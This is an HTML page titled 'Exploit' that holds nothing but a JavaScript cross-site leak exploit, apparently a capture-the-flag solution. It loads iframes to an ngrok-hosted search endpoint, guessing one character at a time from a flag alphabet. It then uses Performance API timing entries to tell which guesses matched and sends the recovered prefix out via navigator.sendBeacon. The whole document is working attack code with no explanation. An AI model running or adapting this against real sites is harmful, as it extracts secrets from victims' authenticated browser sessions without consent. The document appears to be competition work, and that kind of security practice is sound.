<html>
    <head>
        <title>Exploit - Ken's Chronicle</title>
    </head>

    <body>

    </body>
    <script>
        async function run() {
            startsWith = window.location.search.substring(1);


            characterSet = "abcdefghijklmno"
            characterSet += "pqrstuvwxyz_{}"


            for (var j = 0; j < characterSet.length; j++){
                bf = startsWith + characterSet[j]
                url = `https://7649ac48b82b.ngrok.io/find?startsWith=${bf}&debug&Timing-Allow-Origin=*`
                
                var iframe = document.createElement('iframe');
                iframe.src = url;
                iframe.onload = "alert()"
                document.body.appendChild(iframe);

            }
        }
        function sleep(ms) {
            return new Promise(resolve => setTimeout(resolve, ms));
        }

        function checker(){
            list = window.performance.getEntriesByType("resource");
            console.log(list)
            for (i=0; i<list.length; i++){
                curr = list[i]
                if (curr.nextHopProtocol == ""){
                    try {
                        navigator.sendBeacon(`?flag=${curr.name.split("startsWith=")[1].split("&")[0]}`)
                    } catch (error) {
                        console.log(error)
                    }
                }
            }
        }

        async function doit() {
            run()
            await sleep(10000);
            checker()
        }
        doit()
    </script>


</html>